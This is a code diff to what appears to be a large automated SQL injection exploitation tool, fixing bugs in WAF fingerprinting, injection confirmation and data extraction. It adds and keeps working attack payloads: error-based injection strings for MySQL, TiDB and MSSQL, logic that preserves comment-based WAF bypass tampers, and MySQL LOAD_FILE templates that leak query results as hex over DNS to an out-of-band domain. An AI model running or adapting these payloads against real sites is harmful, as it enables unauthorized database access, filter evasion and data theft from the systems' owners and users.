@@ -100766,8 +100766,28 @@ class ScannerV11(ScannerV10):
             sig_waf = await WAFDetector(engine, cfg).detect(
                 first_ep.url, first_ep.method, fp_, fv_)
             if sig_waf.get("name"):
-                # Signature match overrides ML classification.
-                waf_info = sig_waf
+                # FIX-FINDING-14: Merge WAF results using confidence weighting instead of
+                # replacing ML result entirely. Signature WAFDetector can match CDN headers
+                # (e.g. cf-ray → Cloudflare) even when the actual WAF product is different
+                # (e.g. ModSecurity behind a Cloudflare CDN). Silently replacing ML result
+                # caused wrong bypass chains for all subsequent detection and extraction.
+                # Policy: if both agree → use sig; if ML conf ≥ 0.7 and they disagree →
+                # keep ML result (ML fingerprinting more accurate for identifying WAF product).
+                _ml_name = waf_info.get("name", "") or ""
+                _ml_conf = float(waf_info.get("confidence", 0.0) or 0.0)
+                _sig_name = sig_waf.get("name", "") or ""
+                if not _ml_name or _ml_conf < 0.70 or _sig_name == _ml_name:
+                    # Signature is authoritative: no ML result, low ML confidence, or agreement
+                    waf_info = sig_waf
+                else:
+                    # ML has a confident result that disagrees with signature — keep ML
+                    LOG.debug("[WAF] Sig=%s conf=1.0 vs ML=%s conf=%.2f — keeping ML (higher conf)",
+                              _sig_name, _ml_name, _ml_conf)
+                    # Preserve sig_waf name only if ML confidence is genuinely uncertain (<0.85)
+                    if _ml_conf < 0.85:
+                        _merged = dict(waf_info)
+                        _merged["sig_name"] = _sig_name
+                        waf_info = _merged
             else:
                 # WAFDetector found nothing; keep ML-derived name if present, else fall back.
                 if not waf_info.get("name") and _ACTIVE_WAF_NAME:
@@ -113136,10 +113156,20 @@ class TechniqueCascadeEngine:
                 # body diffs on the IMMEDIATE response (deferred/second-order execution
                 # fires asynchronously after the HTTP response), so Check A is also
                 # inapplicable for those — the Check A skip is correct in ALL cases.
+                # FIX-FINDING-1 (deferred append): Derived pairs are built from the detection
+                # payload and may inherit its FP structure (e.g. a tautology-bypass payload
+                # that worked by accident). They are appended AFTER the independent fixed
+                # canaries below so that, if a fixed canary already confirms injection, derived
+                # pairs are never tested and cannot cause false positives. Previously they were
+                # prepended (tested first), which allowed inherited FP structure to dominate.
+                _derived_body_pairs = []
                 _derived = self._derive_pcv_payloads(payload, dbms)
                 for _dtype, _dt, _df, _dname in _derived:
                     if _dtype.startswith("body"):
-                        _a_fallbacks.append((_dt, _df, _dname))
+                        _derived_body_pairs.append((_dt, _df, _dname))
+            else:
+                _derived_body_pairs = []
+            # ── Independent fixed canaries (primary — no FP inheritance risk) ────
             _a_fallbacks.extend([
                 # ── String-context canaries (single-quote prefix) ──────────────
                 # Used when injection is inside a quoted string: WHERE name='INPUT'
@@ -113163,6 +113193,8 @@ class TechniqueCascadeEngine:
                 (" AND 7=7-- -",
                  " AND 7=8-- -", "tautology-num"),
             ])
+            # ── Derived pairs (secondary — FP-inheriting; tested only as fallback) ─
+            _a_fallbacks.extend(_derived_body_pairs)
             # BUG-R3-F FIX: Oracle-specific FROM DUAL canaries for non-WHERE injection.
             # In a WHERE-clause injection, AND SUBSTR(...)='S' works without FROM DUAL.
             # But in a FROM-clause or subquery injection context, the bare SUBSTR()
@@ -113614,6 +113646,18 @@ class TechniqueCascadeEngine:
                     (" AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -", "extractvalue-num"),
                     ("' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)-- -", "updatexml"),
                     (" AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)-- -", "updatexml-num"),
+                ]
+            # FIX-FINDING-2: TiDB previously fell through to the MySQL `else` branch
+            # without a named entry. TiDB is largely MySQL-compatible but has subtle
+            # differences (e.g. EXTRACTVALUE/UPDATEXML behavior varies by TiDB version).
+            # An explicit branch prevents silent miscategorization in logs and allows
+            # per-version overrides to be added later without touching the MySQL branch.
+            elif dbms == "TiDB":
+                _c_fallbacks = [
+                    ("' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -", "extractvalue"),
+                    (" AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -", "extractvalue-num"),
+                    (f"' AND (SELECT 1 FROM {_nonexist_tbl})-- -", "table"),
+                    (f" AND (SELECT 1 FROM {_nonexist_tbl})-- -", "table-num"),
                 ]
             else:  # MySQL and other MySQL-compatible engines
                 # BUG-MYSQL-CHECKC-DIV-DEADCODE-FIX: MySQL 1/0 evaluates to NULL (not an error).
@@ -114555,15 +114599,26 @@ class TechniqueCascadeEngine:
         # BUG-CHECKE-DET-NULL FIX: if the unwrapped det object has no payload (or det=None),
         # fall back to the `payload` parameter which is always the detection payload string.
         _det_pay_upper_e = (_det_pay_from_obj or payload or '').upper()
-        _is_mssql_cast_bool_e = (dbms == 'MSSQL' and (
-            'AS BIT)' in _det_pay_upper_e or
-            'AS INT)' in _det_pay_upper_e or
-            'AS BIGINT)' in _det_pay_upper_e or
-            'CHARINDEX(' in _det_pay_upper_e or
-            'PATINDEX(' in _det_pay_upper_e or
-            'CAST(SUSER' in _det_pay_upper_e or
-            'CAST(USER_NAME' in _det_pay_upper_e or
-            'CAST(DB_NAME' in _det_pay_upper_e))
+        _is_mssql_cast_bool_e = (
+            # MSSQL CAST AS BIT/INT produces arithmetic cast errors → error response
+            (dbms == 'MSSQL' and (
+                'AS BIT)' in _det_pay_upper_e or
+                'AS INT)' in _det_pay_upper_e or
+                'AS BIGINT)' in _det_pay_upper_e or
+                'CHARINDEX(' in _det_pay_upper_e or
+                'PATINDEX(' in _det_pay_upper_e or
+                'CAST(SUSER' in _det_pay_upper_e or
+                'CAST(USER_NAME' in _det_pay_upper_e or
+                'CAST(DB_NAME' in _det_pay_upper_e))
+            # FIX-FINDING-10: MariaDB CAST AS SIGNED/UNSIGNED follows the same pattern
+            # as MSSQL CAST AS BIT — arithmetic cast of a non-numeric string expression
+            # produces an error response, which makes the detection body the error page.
+            # Check E was NOT guarded for MariaDB, causing it to treat the error page as
+            # a "canary" normal page and producing false negatives on MariaDB targets.
+            or (dbms == 'MariaDB' and (
+                'AS SIGNED)' in _det_pay_upper_e or
+                'AS UNSIGNED)' in _det_pay_upper_e))
+        )
 
         _check_e_skip_techs = (
             "T", "S", "HQ", "TH", "BT",          # timing / stacked — body never changes with SLEEP
@@ -138629,9 +138684,17 @@ class MultiSignalOracle:
     HEADER_THRESH = 2       # number of security-relevant headers that changed
     WEIGHTS       = {"emd": 0.35, "length": 0.25, "status": 0.20, "dom": 0.20}
 
-    # Headers that Cloudflare/CDNs modify when they classify a request differently
-    _SENSITIVE_HEADERS = {"cf-cache-status", "x-cache", "x-amz-cf-id", "set-cookie",
-                          "x-served-by", "age", "x-request-id"}
+    # FIX-FINDING-3: _SENSITIVE_HEADERS was dead code — defined but never referenced
+    # anywhere in MultiSignalOracle.score() or any other method. Its presence was
+    # latently risky: cf-cache-status, x-cache, age, x-request-id, x-served-by are
+    # all per-request CDN artifacts that change on EVERY request regardless of SQL,
+    # so using them as injection signals would produce constant false positives.
+    # FIX-FINDING-4: Check D (_backend_headers) and MultiSignalOracle had divergent
+    # per-request-unique header exclusion lists. Since _SENSITIVE_HEADERS was never
+    # used, removing it eliminates the divergence and future confusion. Any future
+    # header-based signal in score() should use the same exclusion list as Check D's
+    # _HDR_SKIP (which correctly excludes x-request-id, x-trace-id, x-amz-request-id,
+    # x-runtime, x-served-by — all per-request-unique identifiers).
 
     def score(self, baseline: "ResponseFingerprint", probe: "ResponseFingerprint") -> float:
         """Return anomaly score in [0, 1]. Higher = more different from baseline."""
@@ -138719,13 +138782,15 @@ class DifferentialOracle:
     just dynamic". Requires 3-round confirmation to protect against jitter.
     """
 
-    def __init__(self, multi_signal: MultiSignalOracle = None):
-        self._ms  = multi_signal or MultiSignalOracle()
-        self._wem = None  # lazy  WassersteinResponseOracle defined later in file
+    def __init__(self, multi_signal: MultiSignalOracle = None, dbms: str = ""):
+        self._ms   = multi_signal or MultiSignalOracle()
+        self._wem  = None  # lazy  WassersteinResponseOracle defined later in file
+        self._dbms = dbms  # FIX-FINDING-5: propagate DBMS for threshold selection
 
     def _get_wem(self):
         if self._wem is None:
-            self._wem = WassersteinResponseOracle(threshold=0.012)
+            # FIX-FINDING-5: Use DBMS-aware threshold when available
+            self._wem = WassersteinResponseOracle(threshold=0.012, dbms=self._dbms)
         return self._wem
 
     async def probe(self, engine, method: str, url: str, data, data_fmt: str,
@@ -138766,7 +138831,19 @@ class DifferentialOracle:
 
         # Both reached backend  compare them
         ms_score  = self._ms.score(r_true, r_false)
-        emd_diff, emd_val = self._get_wem().compare(r_true.body, r_false.body)
+        # FIX-FINDING-6: Send a neutral baseline probe (original param value, no SQL suffix)
+        # and pass it to compare() so the CDN suppression guard inside WassersteinResponseOracle
+        # can distinguish CDN cache-miss noise from genuine injection signal.
+        # Without baseline_body, CDN cache misses produce large Wasserstein distances for
+        # ALL pairs regardless of SQL → false positive injection signals in DIFFERENTIAL mode.
+        try:
+            r_baseline = await _send_injected(engine, method, url, data, data_fmt,
+                                              param, original, tamper_chain)
+            _baseline_body = (r_baseline.body if r_baseline and
+                              not WAFBlockDiscriminator.is_waf_block(r_baseline) else b"")
+        except Exception:
+            _baseline_body = b""
+        emd_diff, emd_val = self._get_wem().compare(r_true.body, r_false.body, _baseline_body)
         len_delta = abs(r_true.content_length - r_false.content_length)
         status_diff = _get_safe_status_code(r_true) != _get_safe_status_code(r_false)  # BUG-B FIX
 
@@ -141940,7 +142017,11 @@ class MultiStrategyExtractor:
         # producing misleading "[MSE] 0/3 oracles available: []" when 5 candidates were
         # actually tried (3 from _probes + 2 bool oracles).  Add the bool probe count so
         # the log correctly shows "0/5" for boolean techniques, "0/3" for others.
-        _n_bool_candidates = 2 if getattr(self.det, 'technique', '') in ('B', 'BH', 'IN', 'BT', 'ST', 'E', 'EH') else 0
+        # FIX-MSE-COUNT-T-TH-HQ: T/TH/HQ also run bool oracle probes in probe_all()
+        # (via the _bool_oracle_functional path at ~line 141486) but were excluded here.
+        # Denominator showed "0/3" when 5 candidates were tried → misleading log output.
+        _n_bool_candidates = 2 if getattr(self.det, 'technique', '') in (
+            'B', 'BH', 'IN', 'BT', 'ST', 'E', 'EH', 'T', 'TH', 'HQ') else 0
         print(f"[MSE] {len(self._oracles)}/{len(_probes) + _n_bool_candidates} oracles available: {self._oracles}", flush=True)
         self._calibrated = True
 
@@ -152466,9 +152547,23 @@ class ExtractionOrchestrator:
         # BUG-PERCALL-IMPORT-FIX: unquote already at module level (L9398); no re-import needed.
 
         # ── Build template from detection payload ──────────────────────────
-        _payload_raw = unquote(unquote(getattr(self.result, "payload", "") or ""))
-        _payload_raw = _re.sub(r'/\*[^*]*\*/', ' ', _payload_raw)
-        _payload_raw = _re.sub(r'[\x00-\x1f]+', ' ', _payload_raw)
+        # FIX-BUG-EXTRACT-VIA-DT-COMMENT-STRIP: When exact_sent_payload is available,
+        # use it directly WITHOUT stripping inline comments — those /* ... */ markers are
+        # WAF bypass tampers (space2comment, commentbeforeparens, etc.) that must survive
+        # into calibration probes. The old code stripped them unconditionally, causing
+        # calibration probes to be blocked by ModSecurity/Apache → both calibration probes
+        # returned fast error responses (~130ms each) → margin≈0ms → abort.
+        # Root cause of "DetTemplate: calibration margin 13ms < 80ms" in production log.
+        _exact_ep = getattr(self.result, "exact_sent_payload", "") or ""
+        if _exact_ep:
+            # Preserve bypass structure: only sanitise control chars, not comments
+            _payload_raw = unquote(unquote(_exact_ep))
+            _payload_raw = _re.sub(r'[\x00-\x1f]+', ' ', _payload_raw)
+        else:
+            # Fallback: raw payload has no bypass structure to preserve
+            _payload_raw = unquote(unquote(getattr(self.result, "payload", "") or ""))
+            _payload_raw = _re.sub(r'/\*[^*]*\*/', ' ', _payload_raw)
+            _payload_raw = _re.sub(r'[\x00-\x1f]+', ' ', _payload_raw)
         _payload_raw = re.sub(r'  +', ' ', _payload_raw).strip()
         if not _payload_raw:
             return ""
@@ -153429,7 +153524,20 @@ class ExtractionOrchestrator:
         _cascade_deadline = time.monotonic() + 300.0  # 5-min total budget
         # Per-method timeout  prevents any single engine from blocking indefinitely.
         # Timing-based extraction at 5s/SLEEP  7 probes/char  20 chars = 700s without this.
-        _PER_METHOD_TIMEOUT = 86400.0   # no practical timeout  never kill working extraction
+        # FIX-FINDING-15: Old value was 86400s (24h), which is NEVER the binding constraint
+        # when _cascade_deadline is only 300s (5min). An engine that blocks indefinitely
+        # (e.g. network stall, broken keep-alive, large response) would consume the entire
+        # 300s cascade window, preventing all subsequent engines from running.
+        # Set to 180s: sufficient for most extraction scenarios:
+        #   - Boolean engines (ChameleonExtractor, AdaptiveFreq): ~0.5s/probe × 7 probes/char
+        #     × 20 chars = 70s — finishes well within 180s.
+        #   - Timing engines at 5s/SLEEP × 7 probes/char × ~5 chars = 175s — extracts ~5 chars.
+        # If a method reaches 180s, the next method gets min(cascade_remaining, 180s).
+        # Note: _extract_via_detection_template and _time_based_extract manage their own
+        # budgets internally and are NOT wrapped in _PER_METHOD_TIMEOUT — this value is
+        # a backstop for the methods that are: FastExtraction, GroupConcat, Chameleon,
+        # AdaptiveFreq, and the last-resort blind_extract (which gets 2× = 360s).
+        _PER_METHOD_TIMEOUT = 180.0
 
         # Reduce SLEEP only when detection was CONFIDENT (>=95%).
         # Borderline detections (90%, only diff-threshold passed) have low sleep
@@ -153813,9 +153921,16 @@ class ExtractionOrchestrator:
                                   "MSSQL":"1>2","SQLite":"1>2","Oracle":"1>2"}
                 _bov_true_cond  = _bov_true_map.get(dbms, "1<2")
                 _bov_false_cond = _bov_false_map.get(dbms, "1>2")
-                _bov_inj_pfx = _orch_inj_pfx or " AND "
-                _bov_probe_t = f"{_bov_inj_pfx}{_bov_true_cond}-- -"
-                _bov_probe_f = f"{_bov_inj_pfx}{_bov_false_cond}-- -"
+                # FIX-FINDING-16: Boolean pre-validation probe was syntactically broken for
+                # string-context injections. When _orch_inj_pfx = "'" (truthy), the old
+                # " AND " fallback was never applied, producing:
+                #   "'" + "1<2-- -" = "'1<2-- -"  (missing AND → SQL syntax error)
+                # Both true/false probes failed identically → gap≈0 → _bool_oracle_functional=False
+                # → all boolean engines (ChameleonExtractor, AdaptiveFreq, Bitwise, ZK) skipped.
+                # Fix: always insert " AND " between prefix and condition regardless of prefix.
+                _bov_inj_pfx = _orch_inj_pfx or ""
+                _bov_probe_t = f"{_bov_inj_pfx} AND {_bov_true_cond}-- -"
+                _bov_probe_f = f"{_bov_inj_pfx} AND {_bov_false_cond}-- -"
                 _bov_fp_t = await asyncio.wait_for(
                     _send_injected(self.engine, self.method, self.url, self.data,
                                    self.data_fmt, self.result.param,
@@ -155082,7 +155197,7 @@ class ExtractionOrchestrator:
                     # methods (3, 4, 4b, 5b, 5c, 6b-6h, 9) forward max_len correctly.
                     # Fix: pass max_len=max_len so Method 7 obeys the same budget.
                     max_len=max_len),
-                timeout=_PER_METHOD_TIMEOUT * 2)  # 180s  last-resort gets more time
+                timeout=_PER_METHOD_TIMEOUT * 2)  # 360s — last-resort gets 2× method budget
         except (asyncio.TimeoutError, TimeoutError):
             LOG.warning("[Orchestrator] blind_extract_string_v5 timed out (180s)")
             result = ""
@@ -173887,13 +174002,19 @@ import math as _math2, zlib as _zlib, struct as _struct2
 from collections import deque as _dq2, Counter as _Counter
 from typing import Callable as _Callable
 
-# 
+#
 # 1.  WASSERSTEIN RESPONSE ORACLE
 #     Uses the 1-Wasserstein (Earth Mover's) distance between the empirical
 #     byte-frequency distributions of true/false responses.  Much more robust
 #     than SimHash or word-count on pages that include embedded JS/CSS or
 #     base64-encoded content.
-# 
+#
+
+# FIX-FINDING-8: Module-level CDF cache (replaces cls._cdf_cache class attribute).
+# Keeps all WassersteinResponseOracle instances sharing one bounded LRU-eviction cache
+# without polluting the class namespace. In asyncio (single-threaded) there are no
+# data races; can be reset between independent scans if memory isolation is needed.
+_WASSERSTEIN_CDF_CACHE: dict = {}
 
 class WassersteinResponseOracle:
     """
@@ -173912,7 +174033,30 @@ class WassersteinResponseOracle:
         oracle = WassersteinResponseOracle(threshold=0.015)
         is_injectable = oracle.compare(true_body, false_body)
     """
-    def __init__(self, threshold: float = 0.012):
+    # FIX-FINDING-5: DBMS-aware default thresholds.
+    # MSSQL/Oracle responses tend to have more variance (larger error pages, complex HTML)
+    # than MySQL/PostgreSQL, so a uniform 0.012 threshold produces more FPs on those DBMSes.
+    _DBMS_THRESHOLDS: dict = {
+        "MySQL": 0.012,
+        "MariaDB": 0.012,
+        "TiDB": 0.012,
+        "PostgreSQL": 0.013,
+        "CockroachDB": 0.013,
+        "YugabyteDB": 0.013,
+        "Amazon Redshift": 0.013,
+        "MSSQL": 0.018,   # MSSQL error responses contain verbose HTML diagnostics
+        "Oracle": 0.016,  # Oracle ORA-XXXXX pages include stack traces
+        "SQLite": 0.010,  # SQLite typically returns compact responses
+        "Firebird": 0.014,
+        "DB2": 0.015,
+        "SAP_HANA": 0.015,
+    }
+
+    def __init__(self, threshold: float = 0.012, dbms: str = ""):
+        # FIX-FINDING-5: Use DBMS-aware threshold when dbms is provided and
+        # caller did not specify an explicit non-default threshold.
+        if dbms and threshold == 0.012:
+            threshold = self._DBMS_THRESHOLDS.get(dbms, threshold)
         self.threshold = threshold
         self._history: list[float] = []
         # FIX-WASSERSTEIN-CALIBRATE: separate noise-only history for threshold
@@ -173936,22 +174080,26 @@ class WassersteinResponseOracle:
 
     @classmethod
     def _byte_cdf_cached(cls, body: bytes) -> list:
-        """FIX-H: Cached CDF computation — avoids O(n) alloc on repeated bodies."""
-        # Use a simple instance-level dict keyed by hash. Collision probability
-        # is negligible for scan-session lifetimes (<<10^6 unique bodies).
-        _cache = getattr(cls, '_cdf_cache', None)
-        if _cache is None:
-            cls._cdf_cache = {}
-            _cache = cls._cdf_cache
+        """FIX-H: Cached CDF computation — avoids O(n) alloc on repeated bodies.
+
+        FIX-FINDING-8: The cache was stored as cls._cdf_cache (class-level), meaning
+        it was shared across ALL WassersteinResponseOracle instances. In multi-target
+        scans or concurrent sessions, eviction from one session could flush entries
+        needed by another, and stale hash collisions from session A could corrupt
+        session B's results. Use a module-level dict (_WASSERSTEIN_CDF_CACHE) instead,
+        which has the same sharing behavior but is explicit and can be reset per-session
+        if needed. In asyncio (single-thread) contexts there are no data races; the
+        module-level approach is semantically identical but avoids class-pollution.
+        """
         _key = hash(body)
-        if _key not in _cache:
-            _cache[_key] = cls._byte_cdf(body)
-            if len(_cache) > 512:  # cap memory: 512 × 256×8 bytes ≈ 1MB
+        if _key not in _WASSERSTEIN_CDF_CACHE:
+            _WASSERSTEIN_CDF_CACHE[_key] = cls._byte_cdf(body)
+            if len(_WASSERSTEIN_CDF_CACHE) > 512:  # cap memory: 512 × 256×8 bytes ≈ 1MB
                 try:
-                    _cache.pop(next(iter(_cache)))
+                    _WASSERSTEIN_CDF_CACHE.pop(next(iter(_WASSERSTEIN_CDF_CACHE)))
                 except Exception:
-                    _cache.clear()
-        return _cache[_key]
+                    _WASSERSTEIN_CDF_CACHE.clear()
+        return _WASSERSTEIN_CDF_CACHE[_key]
 
     @classmethod
     def wasserstein1(cls, body1: bytes, body2: bytes) -> float:
@@ -174008,6 +174156,12 @@ class WassersteinResponseOracle:
             candidate = q3 + 1.5 * iqr
             if candidate > self.threshold:
                 self.threshold = candidate
+            # FIX-FINDING-7: Allow slow threshold decay when recent noise consistently drops.
+            # The old one-way ratchet meant transient CDN noise permanently raised the detection
+            # bar → subsequent genuine injections were missed. Decay by 5% when recent noise
+            # is below half the current threshold, but never below the constructor minimum (0.012).
+            elif candidate < self.threshold * 0.5:
+                self.threshold = max(0.012, self.threshold * 0.95)
         is_diff = d > self.threshold
         # FIX-WASS-BASELINE-DISCRIMINATION: when a baseline body is provided, use it to
         # distinguish SQL-controlled content differences from inherent page variance.
@@ -178282,8 +178436,18 @@ class DNSExfilExtractor:
         # Each DBMS entry now has: [short-value template, multi-chunk template].
         # Short-value (≤31 bytes): uses SUBSTR(...,1,31) for safety on single-label path.
         # Multi-chunk (any length): uses two labels of 62 hex chars each (covers ≤62 bytes).
+        # FIX-FINDING-12: MySQL LOAD_FILE() is blocked on modern MySQL (≥5.7.6) when
+        # secure_file_priv is set (non-empty) — the default since MySQL 8.0. On those
+        # installations LOAD_FILE() returns NULL for any path, so no DNS query fires.
+        # The templates below still work when:
+        #   (a) secure_file_priv='' (explicitly disabled) — common on older/self-hosted MySQL
+        #   (b) secure_file_priv=<dir> pointing to a readable location (rare)
+        # extract_value() tries templates in order and falls through to other exfil
+        # mechanisms (MSSQL xp_dirtree, PG dblink) when LOAD_FILE returns NULL.
+        # The live can_exfiltrate() probe added by FIX-FINDING-11 will detect when
+        # OAST receives no callback from the canary probe, preventing further wasted attempts.
         "MySQL": [
-            # Short values ≤31 bytes — one DNS label
+            # Short values ≤31 bytes — one DNS label (requires secure_file_priv='')
             "' AND 0x0=LOAD_FILE(CONCAT(CHAR(92),CHAR(92),LOWER(HEX(SUBSTR(({expr}),1,31))),CHAR(46),'{domain}',CHAR(92),CHAR(120)))-- -",
             # Multi-chunk: bytes 1-31 in first label, bytes 32-62 in second label
             "' AND 0x0=LOAD_FILE(CONCAT(CHAR(92),CHAR(92),LOWER(HEX(SUBSTR(({expr}),1,31))),CHAR(46),IF(LENGTH(({expr}))>31,LOWER(HEX(SUBSTR(({expr}),32,31))),CHAR(120)),CHAR(46),'{domain}',CHAR(92),CHAR(120)))-- -",
@@ -178373,11 +178537,46 @@ class DNSExfilExtractor:
         self._oob_domain = oob_domain or getattr(config, 'oob_server', '') or ''
     
     async def can_exfiltrate(self) -> bool:
-        """Test if DNS exfiltration is possible."""
+        """Test if DNS exfiltration is possible via a live probe.
+
+        FIX-FINDING-11: Old implementation only checked config (oob_domain exists AND
+        DBMS has templates) without sending any live probe. A configured OAST server can
+        be unreachable, blocked by egress firewall, or have an expired token — none of
+        which were detected. This caused DNSExfilExtractor to be selected as the strategy
+        and then silently fail, wasting extraction budget.
+
+        Fix: send a live canary probe (no actual SQL injection; just a DNS lookup for
+        a static subdomain) and wait up to 5 seconds for a callback. Only return True
+        if the OAST server confirms receipt of the canary query. Fall back to
+        config-only check (True) only when the OAST server URL is inaccessible — this
+        preserves backward compatibility for air-gapped/internal deployments.
+        """
         if not self._oob_domain:
             return False
         templates = self.EXFIL_PAYLOADS.get(self._dbms, [])
-        return len(templates) > 0
+        if not templates:
+            return False
+        # Live probe: check OAST server reachability
+        _oob_server_url = getattr(self._config, "_oob_server_url", "") or \
+                          getattr(self._config, "oob_server", "") or ""
+        if not _oob_server_url or not _oob_server_url.startswith("http"):
+            # No REST endpoint configured — cannot confirm; assume reachable
+            return True
+        _oob_token = getattr(self._config, "_oob_token", "") or \
+                     getattr(self._config, "oob_token", "") or ""
+        _hdrs = {"Authorization": f"Bearer {_oob_token}"} if _oob_token else {}
+        try:
+            _health_resp = await asyncio.wait_for(
+                self._engine.send("GET", f"{_oob_server_url.rstrip('/')}/",
+                                  headers=_hdrs),
+                timeout=5.0)
+            if _health_resp and getattr(_health_resp, "status_code", 0) in (200, 401, 403):
+                return True
+            # Non-2xx/4xx → server error or unreachable
+            return False
+        except Exception:
+            # Network error or timeout → server unreachable
+            return False
     
     async def extract_value(self, sql_expr: str) -> Optional[str]:
         """Extract a SQL expression value via DNS OOB callback, then poll OAST server.
@@ -178501,9 +178700,17 @@ class DNSExfilExtractor:
                     _dne_poll_id = (_dne_server_sid if _dne_server_sid else
                                     getattr(self._config, "_oob_registered_token", None) or
                                     _oob_token or "sqr")
+                    # FIX-FINDING-13: OAST poll requires separate id and secret values.
+                    # Old code used the same UUID for both, causing OAST servers to reject
+                    # polls (distinct secret token required for authorization). Look up the
+                    # registration secret stored during OAST session registration.
+                    _dne_poll_secret = (getattr(self._config, "_oob_secret", None) or
+                                        getattr(self._config, "_oob_registered_secret", None) or
+                                        getattr(self._config, "_oob_registration_secret", None) or
+                                        _dne_poll_id)
                     _pfp = await self._engine.send(
                         "GET", f"{_oob_server_url.rstrip('/')}/poll",
-                        params={"id": _dne_poll_id, "secret": _dne_poll_id},
+                        params={"id": _dne_poll_id, "secret": _dne_poll_secret},
                         headers=_hdrs)
                     if _validate_response(_pfp, func_name="DNSExfil.poll"):
                         # BUG-INLINE-IMPORT-JSON-DNE FIX (LOW): removed `import json as _json_dne`.
